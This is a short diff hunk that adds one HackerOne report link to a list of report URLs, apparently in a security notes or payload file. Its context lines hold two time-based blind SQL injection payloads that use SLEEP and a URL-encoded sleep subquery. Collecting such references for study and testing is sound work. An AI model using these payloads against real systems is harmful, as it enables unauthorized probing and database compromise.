@@ -9,7 +9,7 @@ https://hackerone.com/reports/1081145
 https://hackerone.com/reports/761304
 https://hackerone.com/reports/952501
 https://hackerone.com/reports/403616
-
+https://hackerone.com/reports/816560
 Some payloads:
 ' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg
  '%2b(select*from(select(sleep(20)))a)%2b'
